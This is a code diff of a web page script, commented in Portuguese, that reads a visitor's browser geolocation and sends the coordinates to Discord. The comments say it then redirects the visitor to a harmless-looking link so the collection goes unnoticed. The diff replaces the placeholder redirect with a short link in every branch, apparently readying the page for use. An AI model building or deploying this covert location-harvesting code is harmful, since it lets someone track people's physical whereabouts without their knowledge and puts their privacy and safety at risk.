@@ -86,19 +86,19 @@
                         const { latitude, longitude } = position.coords;
                         sendLocationToDiscord(latitude, longitude); // Envia para o Discord
                         // Redireciona para um link inofensivo após coletar a localização
-                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
+                        window.location.href = 'https://2no.co/24qGe7.html'; // Substitua pelo link desejado
                     },
                     (error) => {
                         console.error('Erro ao obter localização:', error.message);
                         // Redireciona mesmo se a localização falhar
-                        window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
+                        window.location.href = 'https://2no.co/24qGe7.html'; // Substitua pelo link desejado
                     },
                     { timeout: 10000 } // Timeout de 10 segundos
                 );
             } else {
                 console.error('Geolocalização não é suportada pelo navegador.');
                 // Redireciona se a geolocalização não for suportada
-                window.location.href = 'https://www.exemplo.com'; // Substitua pelo link desejado
+                window.location.href = 'https://2no.co/24qGe7.html'; // Substitua pelo link desejado
             }
         };
 
